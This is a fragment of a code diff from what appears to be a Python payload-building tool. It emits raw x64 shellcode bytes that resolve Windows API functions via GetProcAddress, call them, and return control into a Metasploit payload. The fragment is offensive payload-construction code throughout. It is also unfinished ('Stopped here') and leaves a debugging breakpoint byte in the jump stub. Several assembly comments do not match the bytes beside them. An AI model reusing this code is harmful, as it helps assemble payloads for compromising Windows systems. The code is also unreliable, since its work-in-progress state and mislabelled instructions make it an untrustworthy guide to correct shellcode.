+                self.stub += b"\x31\xC0"                    # XOR EAX,EAX                    ; Prep EAX for use
+                # this push on x64?? Look at it on x86 (might not be important)
+
+                self.stub += b"\x50"                            # push EAX
+            elif self.DLL_INFO['importname'].lower() == 'kernel32.dll' or self.DLL_INFO['importname'] == 'main_module' or self.parser_stub == 'ExternGPA':
+                self.stub += b"\x33\xC0"                        # XOR EAX,EAX                    ; Prep EAX for use    
+            else:
+                sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
+                sys.exit(-1)
+            self.stub += b"\x8B\x8E"                            # MOV ECX,DWORD PTR DS:[ESI-XX]  ; Put API Offset in ECX
+            self.stub += struct.pack("<I", updated_offset + 4)  
+            self.stub += b"\x8A\xC5"                            # MOV AL,CH                      ; mov API offset to ECX
+            self.stub += b"\x48\x89\xF1"                            # MOV RCX,RSI                    ; mov offset to ecx
+            self.stub += b"\x48\x01\xC1"                        # ADD ECX,EAX                    ; find API location
+            self.stub += b"\x48\x81\xE9"                            # SUB ECX,XX                     ; normalize for ascii value
+            self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff + 4))
+            self.stub += b"\x48\x87\xD1"                            # xchg rcx, rdx                  ; Use the proper registers for gpa
+            self.stub += b"\x48\x83\xEC\x20"                        # sub rsp, 0x20
+            self.stub += b"\x3E\xFF\x55\x00"                        # CALL DWORD PTR DS:[RBP]        ; Call Getprocaddress(DLL.handle, API)
+            # Call API RAX has API
+            #Stopped here
+            # now I need to track the stack
+            # restore stuff stack and return
+            #self.stub += b"\x89\x44\x24\x1C"                    # MOV DWORD PTR SS:[ESP+1C],EAX  ; SAVE EAX for popad ends up in eax
+            #self.stub += b"\x61"                                # POPAD                          ; Restore registers and call values
+            self.stub += b"\x48\x83\xC4\x40"                     # SUB RSP, 48
+            self.stub += b"\x5E"                                 # pop rsi
+            self.stub += b"\x59"                                 # pop rcx
+            self.stub += b"\x5A"                                 # pop rdx
+            self.stub += b"\x41\x58"                             # pop r8
+            self.stub += b"\x41\x59"                             # pop r9
+            self.stub += b"\x48\x8B\x6C\x24\x20"                 # mov rbp, [rsp+0x20]                        ; get return addr
+            self.stub += b"\xFF\xD0"                             # CALL RAX                       ; call target API
+            # Recover
+            self.stub += b"\x55"                                 # push rbp                       ; push return addr into msf caller
+            self.stub += b"\xe8\x00\x00\x00\x00"                 # call $+5                       ; get pc
+            self.stub += b"\x5D"                                 # POP RBP                        ; current EIP in EBP
+            self.stub += b"\x48\x81\xED"                         # SUB RBP,XX                     ; To reset the location of the api call back
+            self.stub += struct.pack("<I", len(self.selected_payload)+ len(self.stub) -4)   
+            self.stub += b"\xC3"                                 # RETN                           ; return back into msf payload logic
 
 
-        self.jump_stub = b"\xe8"
-        self.jump_stub += struct.pack("<I", len(self.selected_payload) + len(self.stub))
+            self.jump_stub = b"\xcc\xe8"
+            self.jump_stub += struct.pack("<I", len(self.selected_payload) + len(self.stub))
         
+
         #look for ebp_offset_update here
         self.fix_up_hardcoded_offsets()
 
